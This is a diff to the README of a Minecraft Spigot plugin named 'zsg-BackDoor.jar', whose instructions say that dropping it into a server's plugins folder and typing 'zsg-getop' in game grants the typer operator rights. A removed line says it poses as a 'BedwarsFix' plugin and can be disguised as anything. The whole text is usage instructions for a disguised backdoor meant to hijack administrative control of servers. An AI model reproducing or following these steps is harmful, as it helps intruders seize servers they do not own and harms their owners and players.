@@ -3,10 +3,8 @@ A Plugin that can let you become operator!
 
 1.Drag "zsg-BackDoor.jar" into the "Plugins"
 
-2.It will pretend as a BedwarsFix plugins，but you can replace it to anythings
+2.Enter the game,type "zsg-getop"
 
-3.Enter the game,type "zsg-getop"
-
-4.Now you are OPERATOR !!!!!!!
+3.Now you are Operator !!
 
 Tips:it is suit all versions of Spigot server.
